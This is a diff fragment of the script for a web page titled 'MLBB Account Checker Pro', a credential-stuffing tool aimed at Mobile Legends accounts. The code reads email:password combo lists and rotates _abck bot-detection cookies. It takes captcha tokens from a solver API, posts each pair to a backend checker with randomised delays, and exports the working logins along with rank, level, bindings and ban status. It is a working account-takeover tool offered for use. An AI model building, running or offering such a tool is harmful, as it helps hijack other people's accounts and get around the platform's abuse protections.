+                elements.apiStatus.className = 'api-status checking';
+                
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                
+                const response = await fetch(`${API_BASE_URL}/health`, {
+                    method: 'GET',
+                    signal: controller.signal
+                });
+                
+                clearTimeout(timeoutId);
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    isApiOnline = true;
+                    elements.apiStatus.innerHTML = `<i class="fas fa-check-circle"></i> API Online | ${data.timestamp || ''}`;
+                    elements.apiStatus.className = 'api-status online';
+                    elements.startBtn.disabled = false;
+                    return true;
+                } else {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+            } catch (error) {
+                isApiOnline = false;
+                elements.apiStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> API Offline | ${error.message}`;
+                elements.apiStatus.className = 'api-status offline';
+                elements.startBtn.disabled = true;
+                return false;
+            }
+        }
+        
+        async function getCaptchaFromApi() {
+            const apiUrl = elements.captchaApiUrl.value;
+            try {
+                const response = await fetch(apiUrl, { timeout: 10000 });
+                const data = await response.json();
+                if (data.success && data.token) return data.token;
+                return null;
+            } catch (error) {
+                console.error('Captcha API error:', error);
+                return null;
+            }
+        }
+        
+        async function checkAccountViaBackend(email, password, abckCookie, captchaToken) {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 30000);
+                
+                const response = await fetch(`${API_BASE_URL}/check`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        abck_cookie: abckCookie,
+                        captcha_token: captchaToken
+                    }),
+                    signal: controller.signal
+                });
+                
+                clearTimeout(timeoutId);
+                
+                const contentType = response.headers.get('content-type');
+                if (!contentType || !contentType.includes('application/json')) {
+                    throw new Error('Server returned non-JSON response');
+                }
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    return {
+                        email: email, password: password, status: result.status,
+                        name: result.data.name, level: result.data.level,
+                        roleId: result.data.role_id, zoneId: result.data.zone_id,
+                        currentRank: result.data.current_rank, highestRank: result.data.highest_rank,
+                        bindings: result.data.bindings, region: result.data.region,
+                        createDate: result.data.create_date, banStatus: result.data.ban_status
+                    };
+                } else {
+                    return {
+                        email: email, password: password, status: result.status || 'invalid',
+                        name: result.status === 'captcha_failed' ? 'Captcha Failed' : 'INVALID',
+                        level: 0, roleId: 'N/A', zoneId: 'N/A', currentRank: 'N/A',
+                        highestRank: 'N/A', bindings: 'N/A', region: 'N/A',
+                        createDate: 'N/A', banStatus: 'No', message: result.message
+                    };
+                }
+            } catch (error) {
+                console.error('Check error:', error);
+                return {
+                    email: email, password: password, status: 'error',
+                    name: 'Error', level: 0, roleId: 'N/A', zoneId: 'N/A',
+                    currentRank: 'N/A', highestRank: 'N/A', bindings: 'N/A',
+                    region: 'N/A', createDate: 'N/A', banStatus: 'No',
+                    message: error.message
+                };
+            }
+        }
+        
+        // ========== UTILITY FUNCTIONS ==========
+        function parseAccounts() {
+            const text = elements.accountsInput.value;
+            return text.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));
+        }
+        
+        function parseAbckCookies() {
+            const text = elements.abckInput.value;
+            return text.split('\n').map(l => l.trim()).filter(l => l);
+        }
+        
+        function parseCaptchas() {
+            const text = elements.captchaInput.value;
+            return text.split('\n').map(l => l.trim()).filter(l => l);
+        }
+        
+        function updateStats() {
+            elements.statValid.textContent = stats.valid;
+            elements.statInvalid.textContent = stats.invalid;
+            elements.statBanned.textContent = stats.banned;
+            elements.statChecked.textContent = stats.checked;
+            elements.statHighestLevel.textContent = stats.highestLevel;
+            elements.liveValid.textContent = stats.valid;
+            elements.liveInvalid.textContent = stats.invalid;
+            elements.liveBanned.textContent = stats.banned;
+            elements.liveChecked.textContent = stats.checked;
+            
+            const percent = stats.total > 0 ? (stats.checked / stats.total) * 100 : 0;
+            elements.progressFill.style.width = `${percent}%`;
+            elements.progressText.textContent = `Checked ${stats.checked} of ${stats.total} accounts (${Math.round(percent)}%)`;
+        }
+        
+        function renderResults() {
+            let filteredResults = results;
+            if (currentFilter === 'valid') filteredResults = results.filter(r => r.status === 'valid');
+            else if (currentFilter === 'invalid') filteredResults = results.filter(r => r.status === 'invalid');
+            else if (currentFilter === 'banned') filteredResults = results.filter(r => r.status === 'banned');
+            
+            if (filteredResults.length === 0) {
+                elements.resultsBody.innerHTML = '<tr><td colspan="12" style="text-align:center">No accounts to display</td></tr>';
+                return;
+            }
+            
+            let html = '';
+            filteredResults.forEach((result, idx) => {
+                const statusClass = `status-${result.status === 'error' ? 'invalid' : result.status}`;
+                const statusText = (result.status === 'error' ? 'INVALID' : result.status.toUpperCase());
+                const displayId = result.roleId && result.zoneId ? `${result.roleId} (${result.zoneId})` : '-';
+                
+                html += `
+                    <tr>
+                        <td>${idx + 1}</td>
+                        <td style="font-family:monospace; font-size:0.7rem">${escapeHtml(result.email)}</td>
+                        <td><span class="status-badge ${statusClass}">${statusText}</span></td>
+                        <td>${escapeHtml(result.name || '-')}</td>
+                        <td style="font-size:0.65rem">${displayId}</td>
+                        <td>${result.level || '-'}</td>
+                        <td>${escapeHtml(result.currentRank || '-')}</td>
+                        <td>${escapeHtml(result.highestRank || '-')}</td>
+                        <td style="font-size:0.7rem">${escapeHtml(result.bindings || '-')}</td>
+                        <td>${escapeHtml(result.region || '-')}</td>
+                        <td style="font-size:0.7rem">${escapeHtml(result.createDate || '-')}</td>
+                        <td style="font-size:0.7rem">${escapeHtml(result.banStatus || '-')}</td>
+                    </tr>
+                `;
+            });
+            elements.resultsBody.innerHTML = html;
+        }
+        
+        function escapeHtml(text) {
+            if (!text) return '-';
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        function addResult(result) {
+            results.push(result);
+            renderResults();
+            triggerAutoSave();
+        }
+        
+        // ========== MAIN CHECKING FUNCTION ==========
+        async function startChecking() {
+            if (isChecking) return;
+            
+            if (!isApiOnline) {
+                const connected = await checkApiConnection();
+                if (!connected) {
+                    alert('Cannot connect to backend API. Please make sure the server is running.');
+                    return;
+                }
+            }
+            
+            accounts = parseAccounts();
+            if (accounts.length === 0) {
+                alert('Please enter accounts in email:password format');
+                return;
+            }
+            
+            abckCookies = parseAbckCookies();
+            if (abckCookies.length === 0) {
+                alert('Please enter at least one _abck cookie');
+                return;
+            }
+            
+            if (captchaMode === 'manual') {
+                captchas = parseCaptchas();
+                if (captchas.length === 0) {
+                    alert('Please enter captcha tokens for manual mode');
+                    return;
+                }
+            }
+            
+            stats = { valid: 0, invalid: 0, banned: 0, checked: 0, total: accounts.length, highestLevel: 0 };
+            results = [];
+            currentIndex = 0;
+            isChecking = true;
+            
+            elements.startBtn.disabled = true;
+            elements.stopBtn.disabled = false;
+            
+            updateStats();
+            renderResults();
+            
+            while (isChecking && currentIndex < accounts.length) {
+                const account = accounts[currentIndex];
+                const [email, password] = account.split(':', 2);
+                
+                const abckIndex = Math.floor(currentIndex / 5) % abckCookies.length;
+                const currentAbck = abckCookies[abckIndex];
+                
+                let captchaToken = '';
+                elements.currentAccount.textContent = `[${currentIndex+1}/${stats.total}] Fetching captcha for ${email}...`;
+                
+                if (captchaMode === 'auto') {
+                    captchaToken = await getCaptchaFromApi();
+                    if (!captchaToken) {
+                        const errorResult = {
+                            email, password, status: 'invalid', name: 'Captcha Failed',
+                            level: 0, roleId: 'N/A', zoneId: 'N/A', currentRank: 'N/A',
+                            highestRank: 'N/A', bindings: 'N/A', region: 'N/A',
+                            createDate: 'N/A', banStatus: 'No'
+                        };
+                        addResult(errorResult);
+                        stats.invalid++;
+                        stats.checked++;
+                        updateStats();
+                        currentIndex++;
+                        continue;
+                    }
+                } else {
+                    captchaToken = captchas[currentIndex % captchas.length];
+                }
+                
+                elements.currentAccount.textContent = `[${currentIndex+1}/${stats.total}] Checking: ${email} | _abck #${abckIndex+1}`;
+                
+                try {
+                    const result = await checkAccountViaBackend(email, password, currentAbck, captchaToken);
+                    
+                    const levelInt = parseInt(result.level) || 0;
+                    if (levelInt > stats.highestLevel) stats.highestLevel = levelInt;
+                    
+                    if (result.status === 'valid') stats.valid++;
+                    else if (result.status === 'banned') stats.banned++;
+                    else stats.invalid++;
+                    
+                    stats.checked++;
+                    addResult(result);
+                    updateStats();
+                } catch (error) {
+                    const errorResult = {
+                        email, password, status: 'error', name: 'Error',
+                        level: 0, roleId: 'N/A', zoneId: 'N/A', currentRank: 'N/A',
+                        highestRank: 'N/A', bindings: 'N/A', region: 'N/A',
+                        createDate: 'N/A', banStatus: 'No'
+                    };
+                    addResult(errorResult);
+                    stats.invalid++;
+                    stats.checked++;
+                    updateStats();
+                }
+                
+                currentIndex++;
+                
+                if (isChecking && currentIndex < accounts.length) {
+                    const minDelay = parseInt(elements.minDelay.value) || 3;
+                    const maxDelay = parseInt(elements.maxDelay.value) || 8;
+                    const delayTime = Math.floor(Math.random() * (maxDelay - minDelay + 1) + minDelay) * 1000;
+                    await delay(delayTime);
+                }
+            }
+            
+            isChecking = false;
+            elements.startBtn.disabled = false;
+            elements.stopBtn.disabled = true;
+            elements.currentAccount.textContent = '';
+            if (currentIndex >= accounts.length) elements.progressText.textContent = '✅ Checking completed!';
+            saveToLocalStorage();
+        }
+        
+        function stopChecking() {
+            isChecking = false;
+            elements.startBtn.disabled = false;
+            elements.stopBtn.disabled = true;
+            elements.progressText.textContent = '⏸️ Checking stopped';
+        }
+        
+        function clearResults() {
+            if (isChecking) { alert('Please stop checking first'); return; }
+            results = [];
+            stats = { valid: 0, invalid: 0, banned: 0, checked: 0, total: 0, highestLevel: 0 };
+            updateStats();
+            renderResults();
+            elements.progressFill.style.width = '0%';
+            elements.progressText.textContent = 'Ready to check accounts';
+            if (autoSaveEnabled) saveToLocalStorage();
+        }
+        
+        function exportResults() {
+            if (results.length === 0) { alert('No results to export'); return; }
+            
+            let validContent = '', invalidContent = '', bannedContent = '';
+            results.forEach(result => {
+                const line = `${result.email}:${result.password} | Nama: ${result.name} | ID: ${result.roleId} (${result.zoneId}) | Level: ${result.level} | Current Rank: ${result.currentRank} | Highest Rank: ${result.highestRank} | Bind: ${result.bindings} | Region: ${result.region} | Create Date: ${result.createDate} | Ban: ${result.banStatus} | Config:@BokirTools\n`;
+                if (result.status === 'valid') validContent += line;
+                else if (result.status === 'banned') bannedContent += line;
+                else invalidContent += `${result.email}:${result.password}\n`;
+            });
+            
+            const date = new Date().toISOString().slice(0,19).replace(/:/g, '-');
+            const fullContent = `=== VALID ACCOUNTS (${stats.valid}) ===\n${validContent}\n=== BANNED ACCOUNTS (${stats.banned}) ===\n${bannedContent}\n=== INVALID ACCOUNTS (${stats.invalid}) ===\n${invalidContent}`;
+            const blob = new Blob([fullContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `BokirTools_${date}.txt`;
+            a.click();
+            URL.revokeObjectURL(url);
+            showToast(`📥 Results exported (${results.length} accounts)`, 'success');
+        }
+        
+        // ========== FILE UPLOAD ==========
+        function uploadAccountsFile() { document.getElementById('accounts-file-input').click(); }
+        function uploadAbckFile() { document.getElementById('abck-file-input').click(); }
+        function uploadCaptchaFile() { document.getElementById('captcha-file-input').click(); }
+        
+        document.getElementById('accounts-file-input').addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (event) => { elements.accountsInput.value = event.target.result; };
+                reader.readAsText(file);
+            }
+        });
+        
+        document.getElementById('abck-file-input').addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (event) => { elements.abckInput.value = event.target.result; };
+                reader.readAsText(file);
+            }
+        });
+        
+        document.getElementById('captcha-file-input').addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (event) => { elements.captchaInput.value = event.target.result; };
+                reader.readAsText(file);
+            }
+        });
+        
+        // ========== CAPTCHA MODE ==========
+        function setCaptchaMode(mode) {
+            captchaMode = mode;
+            if (mode === 'auto') {
+                document.getElementById('manual-captcha-section').style.display = 'none';
+                document.getElementById('auto-captcha-section').style.display = 'block';
+                document.getElementById('captcha-auto-btn').style.background = '#00d4ff20';
+                document.getElementById('captcha-manual-btn').style.background = '';
+            } else {
+                document.getElementById('manual-captcha-section').style.display = 'block';
+                document.getElementById('auto-captcha-section').style.display = 'none';
+                document.getElementById('captcha-manual-btn').style.background = '#00d4ff20';
+                document.getElementById('captcha-auto-btn').style.background = '';
+            }
+        }
+        
+        // ========== FILTER ==========
+        function setFilter(filter) { currentFilter = filter; renderResults(); }
+        
+        // ========== EVENT LISTENERS ==========
+        elements.startBtn.addEventListener('click', startChecking);
+        elements.stopBtn.addEventListener('click', stopChecking);
+        elements.clearBtn.addEventListener('click', clearResults);
+        elements.exportBtn.addEventListener('click', exportResults);
+        document.getElementById('upload-accounts-btn').addEventListener('click', uploadAccountsFile);
+        document.getElementById('upload-abck-btn').addEventListener('click', uploadAbckFile);
+        document.getElementById('upload-captcha-btn').addEventListener('click', uploadCaptchaFile);
+        document.getElementById('captcha-auto-btn').addEventListener('click', () => setCaptchaMode('auto'));
+        document.getElementById('captcha-manual-btn').addEventListener('click', () => setCaptchaMode('manual'));
+        document.getElementById('filter-all').addEventListener('click', () => setFilter('all'));
+        document.getElementById('filter-valid').addEventListener('click', () => setFilter('valid'));
+        document.getElementById('filter-invalid').addEventListener('click', () => setFilter('invalid'));
+        document.getElementById('filter-banned').addEventListener('click', () => setFilter('banned'));
+        document.getElementById('save-session-btn').addEventListener('click', () => saveToLocalStorage() && showToast('Session saved', 'success'));
+        document.getElementById('load-session-btn').addEventListener('click', loadFromLocalStorage);
+        document.getElementById('clear-storage-btn').addEventListener('click', clearStorage);
+        document.getElementById('export-data-btn').addEventListener('click', exportAllData);
+        document.getElementById('apply-api-url').addEventListener('click', () => setApiUrl(elements.backendApiUrl.value, true));
+        document.getElementById('reset-api-url').addEventListener('click', resetApiUrl);
+        
+        elements.autoSaveToggle.addEventListener('change', (e) => {
+            autoSaveEnabled = e.target.checked;
+            showToast(autoSaveEnabled ? 'Auto Save ON' : 'Auto Save OFF', 'info');
+            if (autoSaveEnabled && results.length > 0) saveToLocalStorage();
+        });
+        
+        // ========== INITIALIZATION ==========
+        //elements.accountsInput.value = 'test1@gmail.com:password123\ntest2@gmail.com:pass456';
+        //elements.abckInput.value = 'abc123_cookie_example_1\nabc123_cookie_example_2';
+        //elements.captchaInput.value = 'captcha_token_example_1\ncaptcha_token_example_2';
+        
+        updateApiUrlDisplay();
+        loadFromLocalStorage();
+        checkApiConnection();
+        
+        console.log('MLBB Account Checker Pro loaded - Dynamic API URL enabled');
+    </script>
+</body>
+</html>
